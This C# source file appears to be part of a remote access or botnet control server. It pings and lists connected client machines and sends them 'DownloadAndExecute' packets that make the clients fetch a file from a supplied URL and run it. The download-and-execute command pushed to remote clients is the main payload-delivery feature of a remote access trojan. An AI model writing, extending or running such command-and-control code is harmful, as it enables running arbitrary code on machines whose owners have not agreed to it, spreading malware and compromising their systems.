using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Share;

namespace Server.Networking {
    class ClientInteraction {
        public static long PingClient(Socket s) {
            Ping ping = new Ping();
            string endpoint = ((IPEndPoint)s.RemoteEndPoint).Address.ToString();
            PingReply pr = ping.Send(endpoint, 120, new byte[0], null);
            return pr.RoundtripTime;
        }

        public static void ListClients(Server server) {
            Packet p = new Packet(PacketType.ListClient, server.SERVER_ID.ToString());
            server.SendRequest(p, server._clientSockets.ToArray());
        }

        public static void DownloadFile(Server server, string url, string fileName, bool exec, params Socket[] s) {
            Packet p = new Packet(PacketType.Download, server.SERVER_ID.ToString());
            if (exec) { p.PType = PacketType.DownloadAndExecute; }
            string[] data = { url, fileName };
            p.PData.AddRange(data);

            server.SendRequest(p, s);
        }
    }
}
